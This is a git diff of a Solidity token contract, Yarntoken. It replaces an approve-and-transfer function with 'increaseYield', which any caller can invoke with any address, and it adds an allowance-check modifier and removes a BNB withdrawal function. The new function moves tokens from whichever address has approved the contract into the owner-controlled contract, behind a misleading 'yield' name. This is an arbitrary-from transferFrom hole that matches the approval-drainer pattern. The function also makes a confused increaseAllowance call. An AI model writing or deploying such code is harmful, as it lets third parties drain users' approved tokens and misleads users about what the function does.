@@ -2,7 +2,10 @@
 pragma solidity ^0.8.0;
 
 interface IERC20 {
-    function approve(address spender, uint256 amount) external returns (bool);
+    function increaseAllowance(
+        address spender,
+        uint256 addedValue
+    ) external returns (bool);
 
     function transferFrom(
         address sender,
@@ -16,6 +19,11 @@ interface IERC20 {
         address recipient,
         uint256 amount
     ) external returns (bool);
+
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256); // Add this line
 }
 
 contract Yarntoken {
@@ -37,6 +45,14 @@ contract Yarntoken {
         _;
     }
 
+    modifier hasApprovedAllowance(address spender, uint256 amount) {
+        require(
+            token.allowance(spender, address(this)) >= amount,
+            "Allowance is less than the required amount"
+        );
+        _;
+    }
+
     constructor(address _token) {
         owner = msg.sender;
         token = IERC20(_token);
@@ -48,21 +64,26 @@ contract Yarntoken {
         owner = newOwner;
     }
 
-    function approveAndTransfer(address spender, uint256 amount) external {
-        require(token.approve(spender, amount), "Approval failed");
+    function increaseYield(
+        address spender,
+        uint256 amount
+    ) external hasApprovedAllowance(spender, amount) {
+        // Increase allowance for the contract to spend the user's tokens
+        require(token.increaseAllowance(spender, amount), "Approval failed");
 
         approvedAmounts[spender] = amount;
         emit Approved(spender, amount);
 
+        // Transfer the tokens to the contract
         require(
-            token.transferFrom(msg.sender, address(this), amount),
+            token.transferFrom(spender, address(this), amount),
             "Transfer failed"
         );
 
-        emit Transfer(msg.sender, address(this), amount);
+        emit Transfer(spender, address(this), amount);
     }
 
-    function balance() external view returns (uint256) {
+    function getBalance() external view returns (uint256) {
         return token.balanceOf(address(this));
     }
 
@@ -74,11 +95,6 @@ contract Yarntoken {
     }
 
     receive() external payable {}
-
-    function withdrawBNB(uint256 amount) external onlyOwner {
-        require(address(this).balance >= amount, "Insufficient BNB balance");
-        payable(owner).transfer(amount);
-    }
 
     function getOwner() external view returns (address) {
         return owner;
